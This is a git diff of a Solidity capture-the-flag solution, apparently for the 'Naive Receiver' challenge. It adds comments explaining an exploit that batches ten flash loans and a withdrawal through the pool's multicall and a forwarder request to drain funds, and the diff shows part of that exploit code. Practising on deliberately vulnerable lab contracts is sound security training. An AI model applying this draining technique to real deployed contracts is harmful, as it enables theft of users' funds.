@@ -81,7 +81,10 @@ contract NaiveReceiverChallenge is Test {
      * CODE YOUR SOLUTION HERE
      */
     function test_naiveReceiver() public checkSolvedByPlayer {
-        // vaciar receiver  DONE
+        // Explain Exploit: The attacker can use the pool's multicall function to batch multiple flash loan requests and a withdrawal into a single transaction, 
+        // allowing them to drain the pool's funds without needing to provide the necessary collateral.
+
+
         // Prepare call data for 10 flash loans and 1 withdrawal
         bytes[] memory callDatas = new bytes[](11);
         
@@ -92,8 +95,7 @@ contract NaiveReceiverChallenge is Test {
             (receiver, address(weth), 0, "0x")
             );
         }
-
-
+        // Encode withdrawal call - to send all WETH to recovery account
          callDatas[10] = abi.encodePacked(
             abi.encodeCall(
             NaiveReceiverPool.withdraw,
@@ -104,7 +106,7 @@ contract NaiveReceiverChallenge is Test {
 
          bytes memory multicallData = abi.encodeCall(pool.multicall, callDatas);
 
-        // Create forwarder request
+        // Create the forwarder request
         BasicForwarder.Request memory request = BasicForwarder.Request(
             player,
             address(pool),
